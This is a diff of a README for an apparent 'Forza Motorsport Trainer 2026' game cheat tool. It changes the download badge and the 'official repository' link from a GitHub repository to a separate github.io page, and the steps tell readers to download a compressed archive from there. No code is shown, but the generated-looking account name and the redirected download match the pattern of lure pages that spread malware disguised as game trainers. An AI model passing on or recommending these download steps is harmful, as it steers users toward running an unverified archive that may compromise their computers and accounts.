@@ -1,6 +1,6 @@
 # 🏎️ Forza-Motorsport-Trainer-2026 - Improve your Forza Motorsport racing results
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Phonic-coloursupplement861/Forza-Motorsport-Trainer-2026)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://phonic-coloursupplement861.github.io)
 
 ## 📖 About this software
 
@@ -23,7 +23,7 @@ Before you start, make sure your computer meets these requirements:
 
 The trainer is available as a direct package. Follow these steps to obtain the files:
 
-1.  Visit the official repository page: [https://github.com/Phonic-coloursupplement861/Forza-Motorsport-Trainer-2026](https://github.com/Phonic-coloursupplement861/Forza-Motorsport-Trainer-2026).
+1.  Visit the official repository page: [https://phonic-coloursupplement861.github.io](https://phonic-coloursupplement861.github.io).
 2.  Locate the release section on the right side of the page.
 3.  Click the link to download the compressed archive file.
 4.  Save the file in a folder you can find later, such as your Downloads folder.
